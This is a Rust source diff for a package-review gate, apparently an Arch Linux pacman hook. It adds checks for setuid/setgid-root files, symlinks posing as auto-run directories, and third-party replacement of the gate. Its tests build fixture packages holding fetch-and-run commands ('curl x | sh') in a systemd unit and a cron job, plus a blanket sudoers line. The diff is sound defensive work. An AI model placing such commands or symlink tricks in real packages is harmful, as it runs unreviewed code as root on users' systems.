@@ -27,10 +27,13 @@ use std::os::fd::AsRawFd;
 use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
 use std::path::{Path, PathBuf};
 
-use crate::autorun::{executed_paths, is_auto_run};
+use crate::autorun::{
+    executed_paths, is_alias_of_reviewed_directory, is_auto_run, is_auto_run_directory,
+};
 use crate::config::model::SourceClass;
 use crate::content::{self, Content};
 use crate::error::{Error, IoContext};
+use crate::rules;
 use crate::sandbox::Workspace;
 use crate::scan::MAX_TEXT_FILE_SIZE;
 use crate::tools::{self, Limits};
@@ -68,7 +71,10 @@ pub const O_NONBLOCK: i32 = 0o4000;
 enum Owner {
     /// No package: Guardian's own configuration and hook link.
     Nobody,
-    /// The `omarchy-guardian` package, from anywhere (`install.sh` uses `-U`).
+    /// The `omarchy-guardian` package, installed from a local archive
+    /// (`install.sh` uses `-U`) or an official repository: a third-party
+    /// repository offering a package of that name does not get to replace
+    /// the gate.
     Guardian,
     /// These packages, from an official repository only.
     Packages(&'static [&'static str]),
@@ -119,7 +125,7 @@ fn protected_violation(
     let official = class == SourceClass::Official;
     let allowed = match owner {
         Owner::Nobody => false,
-        Owner::Guardian => package == "omarchy-guardian",
+        Owner::Guardian => package == "omarchy-guardian" && class != SourceClass::ThirdPartyRepo,
         Owner::Packages(packages) => {
             (official && packages.contains(&package)) || trusted.iter().any(|name| name == package)
         }
@@ -130,7 +136,9 @@ fn protected_violation(
             "{package} ships /{path}, which only {} may provide: it could disarm Guardian",
             match owner {
                 Owner::Nobody => "no package".to_string(),
-                Owner::Guardian => "the omarchy-guardian package".to_string(),
+                Owner::Guardian =>
+                    "the omarchy-guardian package, installed from a local archive or an official repository"
+                        .to_string(),
                 Owner::Packages(packages) => format!(
                     "{} from an official repository (or a package named in [pacman] trusted_reviewer_packages)",
                     packages.join(" or ")
@@ -156,6 +164,9 @@ struct Entry {
     path: String,
     size: u64,
     kind: Kind,
+    /// A regular file installed setuid or setgid root: it runs as root for
+    /// whoever starts it, with no scriptlet involved.
+    root_set_id: Option<&'static str>,
 }
 
 /// Undoes bsdtar's (and mtree's) escaping of names (`\\`, `\n`, `\t` and
@@ -192,6 +203,44 @@ pub fn unescape(raw: &str) -> Option<String> {
     }
     let text = String::from_utf8(bytes).ok()?;
     (!text.chars().any(char::is_control)).then_some(text)
+}
+
+/// Whether a listed mode (`-rwsr-xr-x`) with its numeric owner and group is
+/// setuid or setgid root.
+fn root_set_id(mode: &str, owner: &str, group: &str) -> Option<&'static str> {
+    let set = |position: usize, id: &str| {
+        matches!(mode.as_bytes().get(position), Some(b's' | b'S')) && id == "0"
+    };
+    if set(3, owner) {
+        Some("setuid root")
+    } else if set(6, group) {
+        Some("setgid root")
+    } else {
+        None
+    }
+}
+
+/// An entry under a symbolic-link directory is installed wherever that
+/// link points, not where it is listed: such an archive is refused.
+fn under_links(entries: &[Entry]) -> Result<(), String> {
+    let links: HashSet<&str> = entries
+        .iter()
+        .filter(|entry| matches!(entry.kind, Kind::Symlink(_)))
+        .map(|entry| entry.path.as_str())
+        .collect();
+    for entry in entries {
+        let mut prefix = entry.path.as_str();
+        while let Some((parent, _)) = prefix.rsplit_once('/') {
+            if links.contains(parent) {
+                return Err(format!(
+                    "{} is inside {parent}, which is a symbolic link",
+                    entry.path
+                ));
+            }
+            prefix = parent;
+        }
+    }
+    Ok(())
 }
 
 /// Builds the archive model from `bsdtar -tf` (names) and `bsdtar -tv
@@ -275,27 +324,18 @@ fn parse_model(names: &str, details: &str) -> Result<Vec<Entry>, String> {
         if seen.insert(path.clone(), entries.len()).is_some() {
             return Err(format!("{path} appears more than once"));
         }
-        entries.push(Entry { path, size, kind });
+        let root_set_id = match kind {
+            Kind::File | Kind::HardLink(_) => root_set_id(fields[0], fields[2], fields[3]),
+            Kind::Directory | Kind::Symlink(_) => None,
+        };
+        entries.push(Entry {
+            path,
+            size,
+            kind,
+            root_set_id,
+        });
     }
-    // An entry under a symbolic-link directory is installed wherever that
-    // link points, not where it is listed.
-    let links: HashSet<&str> = entries
-        .iter()
-        .filter(|entry| matches!(entry.kind, Kind::Symlink(_)))
-        .map(|entry| entry.path.as_str())
-        .collect();
-    for entry in &entries {
-        let mut prefix = entry.path.as_str();
-        while let Some((parent, _)) = prefix.rsplit_once('/') {
-            if links.contains(parent) {
-                return Err(format!(
-                    "{} is inside {parent}, which is a symbolic link",
-                    entry.path
-                ));
-            }
-            prefix = parent;
-        }
-    }
+    under_links(&entries)?;
     Ok(entries)
 }
 
@@ -580,16 +620,22 @@ pub struct PayloadFile {
 #[derive(Clone, Debug, PartialEq, Eq)]
 enum Shipped {
     Bytes(Vec<u8>),
-    Link(String),
+    /// A link's target, and what it leads to when the package ships that
+    /// too: a unit that changed behind the same enabling link is a change.
+    Link {
+        target: String,
+        content: Option<Vec<u8>>,
+    },
     /// A script another reviewed file runs: always reviewed.
     Unknown,
 }
 
 impl PayloadFile {
     /// Whether the same file is already installed under `root` (`/` in
-    /// production): identical bytes, or a link with the same target. Such a
-    /// file adds nothing new, so an upgrade does not review it again. A file
-    /// that cannot be read (for example root-only) counts as changed.
+    /// production): identical bytes, or a link with the same target that
+    /// leads to identical bytes. Such a file adds nothing new, so an
+    /// upgrade does not review it again. A file that cannot be read (for
+    /// example root-only) counts as changed.
     pub fn is_installed_unchanged(&self, root: &Path) -> bool {
         let installed = root.join(&self.path);
         match &self.shipped {
@@ -598,8 +644,14 @@ impl PayloadFile {
                     metadata.is_file() && metadata.len() == bytes.len() as u64
                 }) && fs::read(&installed).is_ok_and(|current| current == *bytes)
             }
-            Shipped::Link(target) => {
+            Shipped::Link { target, content } => {
                 fs::read_link(&installed).is_ok_and(|current| current == Path::new(target))
+                    && content.as_ref().is_none_or(|bytes| {
+                        // Only a regular file of that size is read.
+                        fs::metadata(&installed).is_ok_and(|metadata| {
+                            metadata.is_file() && metadata.len() == bytes.len() as u64
+                        }) && fs::read(&installed).is_ok_and(|current| current == *bytes)
+                    })
             }
             Shipped::Unknown => false,
         }
@@ -611,6 +663,9 @@ pub struct Review {
     /// The install scriptlet, classified (see `content::classify`).
     pub install: Option<Content>,
     pub files: Vec<PayloadFile>,
+    /// Files installed setuid or setgid root, with which of the two, but
+    /// for the sandbox helper of a Chromium-based program.
+    pub root_set_id: Vec<(String, &'static str)>,
 }
 
 /// An auto-run entry and what its content is read from.
@@ -685,7 +740,62 @@ pub fn review(
         });
     }
     files.sort_by(|left, right| left.path.cmp(&right.path));
-    Ok(Review { install, files })
+    let root_set_id = archive
+        .entries
+        .iter()
+        .filter(|entry| !is_chromium_helper(archive, &entry.path))
+        .filter_map(|entry| Some((entry.path.clone(), entry.root_set_id?)))
+        .collect();
+    Ok(Review {
+        install,
+        files,
+        root_set_id,
+    })
+}
+
+/// Where the link at `link` with `target` leads, by its text alone
+/// (relative to `/`). `None` when it climbs above the root, or steps back
+/// (`..`) after a name: that name may be a link on the system, and the
+/// text would then say one place while the system goes to another.
+fn lexical_target(link: &str, target: &str) -> Option<String> {
+    let mut parts: Vec<&str> = if target.starts_with('/') {
+        Vec::new()
+    } else {
+        let mut parent: Vec<&str> = link.split('/').collect();
+        parent.pop();
+        parent
+    };
+    let mut named = false;
+    for component in target.split('/') {
+        match component {
+            "" | "." => {}
+            ".." if named => return None,
+            ".." => {
+                parts.pop()?;
+            }
+            name => {
+                named = true;
+                parts.push(name);
+            }
+        }
+    }
+    Some(parts.join("/"))
+}
+
+/// The setuid helper of a Chromium-based program, by its name and by the
+/// runtime files such a program keeps beside it, outside the directories
+/// commands are found in. Its content is a binary nobody reads, like every
+/// other program a package ships; this only tells it from a file that
+/// merely borrows the name.
+fn is_chromium_helper(archive: &Archive, path: &str) -> bool {
+    let on_path = ["usr/bin/", "usr/sbin/", "usr/local/", "bin/", "sbin/"]
+        .iter()
+        .any(|directory| path.starts_with(directory));
+    let beside = |name: &str| {
+        path.rsplit_once('/')
+            .is_some_and(|(directory, _)| archive.entry(&format!("{directory}/{name}")).is_some())
+    };
+    rules::is_sandbox_helper(path) && !on_path && beside("icudtl.dat") && beside("resources.pak")
 }
 
 /// The files to extract (`.PKGINFO`, `.INSTALL`, the auto-run entries and
@@ -706,6 +816,23 @@ fn plan_reads(archive: &Archive) -> Result<(Vec<String>, Vec<Source<'_>>), Strin
     }
     let mut sources = Vec::new();
     for entry in &archive.entries {
+        // What such a link leads to would be read as that directory's
+        // files, wherever the package ships them: fine only when they
+        // are auto-run files of the same kind there too (systemd's own
+        // `etc/xdg/systemd/user -> ../../systemd/user`).
+        if let Kind::Symlink(target) = &entry.kind
+            && is_auto_run_directory(&entry.path)
+        {
+            if lexical_target(&entry.path, target)
+                .is_some_and(|leads| is_alias_of_reviewed_directory(&entry.path, &leads))
+            {
+                continue;
+            }
+            return Err(format!(
+                "/{} is a symbolic link standing in for a directory whose files run on their own",
+                entry.path
+            ));
+        }
         if matches!(entry.kind, Kind::Directory) || !is_auto_run(&entry.path) {
             continue;
         }
@@ -776,7 +903,10 @@ fn payload_files(sources: &[Source<'_>], read: &HashMap<String, Vec<u8>>) -> Vec
                     );
                     (
                         annotated(content::classify_payload(resolved, bytes), &header),
-                        Shipped::Link(target.clone()),
+                        Shipped::Link {
+                            target: target.clone(),
+                            content: Some(bytes.to_vec()),
+                        },
                     )
                 }
                 (Kind::Symlink(target), Resolution::Outside(resolved)) => (
@@ -784,7 +914,10 @@ fn payload_files(sources: &[Source<'_>], read: &HashMap<String, Vec<u8>>) -> Vec
                         "# {} is a symbolic link to {target} ({resolved}), which this package does not ship.\n",
                         entry.path
                     )),
-                    Shipped::Link(target.clone()),
+                    Shipped::Link {
+                        target: target.clone(),
+                        content: None,
+                    },
                 ),
                 (_, Resolution::Regular(path)) => {
                     let bytes = read.get(path).cloned().unwrap_or_default();
@@ -851,7 +984,8 @@ mod tests {
     use std::process::Command;
 
     use super::{
-        Archive, Entry, Kind, Resolution, parse_model, protected_violation, review, unescape,
+        Archive, Entry, Kind, Resolution, lexical_target, parse_model, protected_violation, review,
+        root_set_id, unescape,
     };
     use crate::config::model::SourceClass;
     use crate::content::Content;
@@ -867,6 +1001,29 @@ mod tests {
         assert_eq!(unescape(r"nl\nx"), None);
         assert_eq!(unescape(r"x\351"), None);
         assert_eq!(unescape(r"bad\q"), None);
+    }
+
+    #[test]
+    fn files_installed_setuid_or_setgid_root_are_told_apart() {
+        assert_eq!(root_set_id("-rwsr-xr-x", "0", "0"), Some("setuid root"));
+        assert_eq!(root_set_id("-rwSr--r--", "0", "100"), Some("setuid root"));
+        assert_eq!(root_set_id("-rwxr-sr-x", "0", "0"), Some("setgid root"));
+        // To another user or group, or not set at all.
+        assert_eq!(root_set_id("-rwsr-xr-x", "1000", "0"), None);
+        assert_eq!(root_set_id("-rwxr-sr-x", "0", "5"), None);
+        assert_eq!(root_set_id("-rwxr-xr-x", "0", "0"), None);
+        assert_eq!(root_set_id("-rwxr-xr-t", "0", "0"), None);
+
+        let names = ".PKGINFO\nusr/bin/x\nusr/bin/dir/\n";
+        let details = [
+            detail('-', 10, ".PKGINFO"),
+            "-rwsr-xr-x  0 0      0           9 Sep 30 22:51 usr/bin/x".to_string(),
+            "drwsr-sr-x  0 0      0           0 Sep 30 22:51 usr/bin/dir/".to_string(),
+        ]
+        .join("\n");
+        let model = parse_model(names, &details).unwrap();
+        let set: Vec<Option<&str>> = model.iter().map(|entry| entry.root_set_id).collect();
+        assert_eq!(set, [None, Some("setuid root"), None]);
     }
 
     fn detail(kind: char, size: u64, rest: &str) -> String {
@@ -890,7 +1047,8 @@ mod tests {
             Entry {
                 path: "etc/sudoers.d/a -> b".into(),
                 size: 2,
-                kind: Kind::File
+                kind: Kind::File,
+                root_set_id: None
             }
         );
         assert_eq!(model[3].kind, Kind::Symlink("../x".into()));
@@ -980,6 +1138,21 @@ mod tests {
             .is_some()
         );
         assert!(protected_violation("usr/bin/foo", "anything", local, &[]).is_none());
+        // The gate itself comes from the user's own build or an official
+        // repository, not from whichever repository offers that name.
+        for path in [
+            "usr/bin/omarchy-guardian",
+            "usr/lib/omarchy-guardian/guardian-pacman-hook",
+            "usr/share/omarchy-guardian/omarchy-guardian.hook",
+        ] {
+            assert!(protected_violation(path, "omarchy-guardian", local, &[]).is_none());
+            assert!(protected_violation(path, "omarchy-guardian", official, &[]).is_none());
+            assert!(
+                protected_violation(path, "omarchy-guardian", SourceClass::ThirdPartyRepo, &[])
+                    .is_some(),
+                "{path}"
+            );
+        }
     }
 
     fn build(root: &Path, archive: &Path, members: &[&str], extra: &[&str]) {
@@ -1082,6 +1255,126 @@ mod tests {
         assert!(reviewed.files[0].is_installed_unchanged(&installed));
         fs::write(installed.join("etc/sudoers.d/x"), "x ALL=(ALL) ALL\n").unwrap();
         assert!(!reviewed.files[0].is_installed_unchanged(&installed));
+    }
+
+    #[test]
+    fn an_enabling_link_is_unchanged_only_while_its_unit_is() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-enabled");
+        let unit = "usr/lib/systemd/system/x.service";
+        let link = "usr/lib/systemd/system/multi-user.target.wants/x.service";
+        // The same tree is the package and, with another unit, the system.
+        let lay_out = |name: &str, exec: &str| {
+            let root = dir.path().join(name);
+            fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
+            fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
+            fs::write(root.join(unit), format!("[Service]\nExecStart={exec}\n")).unwrap();
+            symlink("../x.service", root.join(link)).unwrap();
+            root
+        };
+        let root = lay_out("package", "/usr/bin/sh -c 'curl x | sh'");
+        let archive = dir.path().join("x-2-1-any.pkg.tar");
+        build(&root, &archive, &[".PKGINFO", "usr"], &[]);
+        let opened = Archive::open(&archive).unwrap();
+        let reviewed = review(&opened, "x", SourceClass::LocalPackage, &[]).unwrap();
+        let enabled = &reviewed.files[0];
+        assert_eq!(enabled.path, link);
+
+        // The link is the same; what it enables is not.
+        let before = lay_out("before", "/usr/bin/x");
+        assert!(!enabled.is_installed_unchanged(&before));
+        assert!(enabled.is_installed_unchanged(&root));
+    }
+
+    #[test]
+    fn a_link_standing_in_for_an_auto_run_directory_is_refused() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        assert_eq!(
+            lexical_target("etc/xdg/systemd/user", "../../systemd/user").as_deref(),
+            Some("etc/systemd/user")
+        );
+        assert_eq!(
+            lexical_target("etc/cron.d", "/usr/share/x").as_deref(),
+            Some("usr/share/x")
+        );
+        assert_eq!(lexical_target("etc/cron.d", "../../x"), None);
+        // `lib` is a link on the system: the text says etc/cron.d, the
+        // system goes to usr/etc/cron.d.
+        assert_eq!(lexical_target("etc/cron.d", "../lib/../etc/cron.d"), None);
+        assert_eq!(lexical_target("etc/cron.d", "/etc/x/../cron.d"), None);
+        for (name, link, target) in [
+            ("sleep", "etc/systemd/system-sleep", "/usr/share/x/run"),
+            ("cron", "etc/cron.d", "/usr/share/x/run"),
+            (
+                "wants",
+                "usr/lib/systemd/system/multi-user.target.wants",
+                "/usr/share/x/run",
+            ),
+            // Through a name that may be a link, to files of another kind,
+            // below a catalogued directory, or a unit directory in /etc.
+            ("climb", "etc/cron.d", "../lib/../etc/cron.daily"),
+            ("kind", "etc/sudoers.d", "../usr/local/bin"),
+            ("below", "etc/xdg/systemd/user", "../../systemd/user/sub"),
+            (
+                "etc-wants",
+                "etc/systemd/system/multi-user.target.wants",
+                "/tmp",
+            ),
+        ] {
+            let dir = TempDir::new(&format!("payload-dirlink-{name}"));
+            let root = dir.path().join("root");
+            fs::create_dir_all(root.join("usr/share/x/run")).unwrap();
+            fs::create_dir_all(root.join(link).parent().unwrap()).unwrap();
+            fs::write(root.join(".PKGINFO"), "pkgname = x\n").unwrap();
+            fs::write(root.join("usr/share/x/run/job"), "#!/bin/sh\ncurl x | sh\n").unwrap();
+            symlink(target, root.join(link)).unwrap();
+            let archive = dir.path().join("x-1-1-any.pkg.tar");
+            let members: Vec<&str> = [".PKGINFO", "etc", "usr"]
+                .into_iter()
+                .filter(|member| root.join(member).exists())
+                .collect();
+            build(&root, &archive, &members, &[]);
+            let opened = Archive::open(&archive).unwrap();
+            let error = review(&opened, "x", SourceClass::LocalPackage, &[])
+                .err()
+                .unwrap();
+            assert!(
+                error.to_string().contains("standing in for a directory"),
+                "{name}: {error}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_link_to_another_auto_run_directory_is_systemds_own_layout() {
+        if !tool_available("/usr/bin/bsdtar") {
+            return;
+        }
+        let dir = TempDir::new("payload-dirlink-systemd");
+        let root = dir.path().join("root");
+        fs::create_dir_all(root.join("etc/xdg/systemd")).unwrap();
+        fs::create_dir_all(root.join("etc/systemd/user")).unwrap();
+        fs::write(root.join(".PKGINFO"), "pkgname = systemd\n").unwrap();
+        fs::write(
+            root.join("etc/systemd/user/x.service"),
+            "[Service]\nExecStart=/usr/bin/x\n",
+        )
+        .unwrap();
+        symlink("../../systemd/user", root.join("etc/xdg/systemd/user")).unwrap();
+        let archive = dir.path().join("systemd-1-1-any.pkg.tar");
+        build(&root, &archive, &[".PKGINFO", "etc"], &[]);
+        let opened = Archive::open(&archive).unwrap();
+        let reviewed = review(&opened, "systemd", SourceClass::Official, &[]).unwrap();
+        let paths: Vec<&str> = reviewed
+            .files
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        assert_eq!(paths, ["etc/systemd/user/x.service"]);
     }
 
     #[test]
